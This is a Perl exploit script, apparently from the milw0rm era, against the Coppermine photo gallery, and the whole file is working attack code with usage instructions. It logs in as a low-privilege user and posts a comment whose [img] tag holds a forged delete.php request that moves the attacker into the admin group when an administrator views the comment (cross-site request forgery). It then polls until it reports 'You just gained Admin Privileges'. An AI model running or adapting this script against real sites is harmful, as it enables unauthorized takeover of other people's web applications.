#!/usr/bin/perl
#inphex - inphex0 at gmail dot com
#based on http://milw0rm.com/exploits/8114 - found by StAkeR
#In case this does not work check out pos(Line 80) and find another value for it
use IO::Socket;
use LWP::UserAgent;
use LWP::Simple;
use HTTP::Cookies;
$_1 = shift; #[HOST]
$h = ($_1 eq ""?($n = 0):($n = 1));
$_2 = shift; #[PATH]
$_3 = shift; #[ID]
$_4 = shift; #[ALBUMNUM]
$_5 = shift; #[USER]
$_6 = shift; #[PASS]
$d_p = 80;
if (!$_1 || !$_2 ||!$_3 ||!$_4 ||!$_5 ||!$_6) {
	print "perl coppermine host /path/ youruserid albumnum yourusername yourpassword\n";
	print "perl coppermine host.com /path/ 3 2 inphex 123456";
	exit;
}
if ($h) {
	$socket = IO::Socket::INET->new(Proto => "tcp",PeerAddr => $_1, PeerPort => $d_p) or die("[-]ERROR");
	print $socket "GET $_2 HTTP/1.1\n";
    print $socket "Host: $_1\n";
    print $socket "Accept: */*\n";
    print $socket "Connection: close\n\n";

	while ($answer = <$socket>) {
		$f_answer = $f_answer.$answer;
	}
	$url = &gen_url($_1,$_2,$_3);
	if ($url) {
		$code = &gen_code($url);
		$res = &_send($_1,$_2,$_3,$_4,$code,$_5,$_6);
	}

}

sub gen_url($$$) {
	$h = shift;
	$p = shift;
	$i = shift;
	$url = "http://".$_1.$_2."delete.php?id=u".$i."&u".$i."=&action=change_group&what=user&new_password=&group=1&delete_files=no&delete_comments=no";
	return $url;
}
sub gen_code($) {
	$url = shift;
	$code = "yoyoyo[img]".$url."[/img]";
	return $code;
}
sub _send($$$$$$$) {
	$h = "http://".shift;
	$p = shift;
	$i = shift;
	$aid = shift;
	$co = shift;
	$u = shift;
	$pass = shift;

	$xpl = LWP::UserAgent->new() or die;
	$cookie_jar = HTTP::Cookies->new();
	$xpl->cookie_jar( $cookie_jar );
	
	$login = $xpl->post($h.$p.'login.php?referer=index.php',
		Content => [
		"username" => $u,
		"password" => $pass,
		"submitted" => "Login",
		 ],);
	if($cookie_jar->as_string) {
		$c = 1;
		print "[+]Connected\n";
		print "[+]Logged in\n";
	}else {
		$c = 0;
	}
	
	if ($c) {
		$con = get("".$h.$p."displayimage.php?album=".$aid."&pos=0"); #pos may be changed
		if ($con =~m/addfav\.php\?pid=(.*?)\&amp/) {
			$p_id = $1;

		}

	}
	
	$se = $xpl->post($h.$p.'db_input.php',Content_Type => 'form-data',
		Content => [
		'msg_author'  => $u,
		'msg_body' => $co,
		'event' => 'comment',
		'pid' => $p_id,
		'submit' => "OK",
		],);
	print "[+]Comment sent\n";
	print "[/]Waiting for admin to view\n";
	$| = 0;
	while (1) {
		sleep(20);
		syswrite STDOUT,"-";
	    $xpl1 = LWP::UserAgent->new() or die;
	    $cookie_jar1 = HTTP::Cookies->new();
	    $xpl1->cookie_jar( $cookie_jar1 );
		$_con = get("".$h.$p."logout.php?referer=index.php");
		$login = $xpl1->post($h.$p.'login.php?referer=index.php',
		    Content => [
		    "username" => $u,
		    "password" => $pass,
		    "submitted" => "Login",
			],);

		$const = $xpl1->get($h.$p."index.php");
		if ($const->as_string =~m/Config/) {
			print "\n[+]You just gained Admin Privileges";
			exit;
		}
	}
}
